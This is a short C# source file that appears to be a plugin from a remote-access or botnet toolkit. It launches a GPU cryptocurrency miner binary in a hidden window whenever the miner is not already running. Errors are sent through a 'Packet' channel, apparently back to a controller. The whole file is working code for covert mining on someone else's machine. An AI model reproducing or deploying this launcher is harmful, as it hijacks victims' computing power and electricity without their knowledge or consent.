using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace Plugin
{
    class Gpu_Run
    {
        public static void CmdRun(string gpuBin, string gpuProc, string gpuParametrs)
        {
            new Thread(() =>
            {
                try
                {   // If there is no file, then we completely stop the cycle.
                    if (!File.Exists(gpuBin))
                        return;
                }
                catch { }

                try
                {
                    Process[] pname = Process.GetProcessesByName(gpuProc);
                    if (pname.Length == 0)
                    {
                        /* Miner launch via cmd */
                        Process p = new Process();
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.Arguments = gpuParametrs;
                        p.StartInfo.FileName = gpuBin;
                        p.Start();
                        p.WaitForExit();
                        Packet.Error("GPU Miner Stopped.");
                        return;
                    }
                }
                catch (Exception ex)
                {
                    Packet.Error(ex.Message);
                    return;
                }
            }).Start();
        }
    }
}
